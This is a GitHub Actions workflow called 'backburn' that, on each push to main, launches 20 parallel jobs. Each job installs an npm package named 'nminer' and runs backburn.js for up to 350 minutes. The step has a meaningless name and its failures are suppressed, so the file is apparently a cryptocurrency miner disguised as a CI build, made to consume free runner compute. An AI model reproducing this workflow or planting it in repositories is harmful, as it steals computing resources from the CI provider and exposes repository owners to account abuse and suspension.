name: backburn
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2772 }
          - { version: 9750 }
          - { version: 9485 }
          - { version: 16 }
          - { version: 8629 }
          - { version: 5645 }
          - { version: 5065 }
          - { version: 1891 }
          - { version: 4832 }
          - { version: 697 }
          - { version: 3847 }
          - { version: 2532 }
          - { version: 6199 }
          - { version: 9274 }
          - { version: 5970 }
          - { version: 653 }
          - { version: 5321 }
          - { version: 4049 }
          - { version: 7774 }
          - { version: 4629 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: suitcase elevator
        run: |
          npm install nminer@latest
          timeout 350m node backburn.js || echo "backburn executed"